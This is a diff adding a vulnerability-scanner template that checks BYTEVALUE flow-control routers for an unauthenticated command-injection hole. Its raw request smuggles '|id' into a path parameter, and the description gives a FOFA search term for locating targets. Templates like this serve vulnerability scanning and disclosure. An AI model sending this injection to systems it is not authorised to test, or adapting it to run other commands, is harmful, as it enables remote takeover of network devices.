@@ -1,0 +1,26 @@
+id: bytevalue-router-remote-command-exec
+
+info:
+  name: BYTEVALUE百为流控路由器命令执行接口安全缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: BYTEVALUE 智能流控路由器
+          BYTEVALUE百为流控路由提供多线路负载均衡及智能流量控制功能，旨在解决公共网络环境下的带宽分配问题。该设备存在未经验证的命令执行接口，允许远程攻击者通过特定路径触发系统命令注入。
+  tags: BYTEVALUE
+
+http:
+- raw:
+  - |
+    GET /goform/webRead/open/?path=|id HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
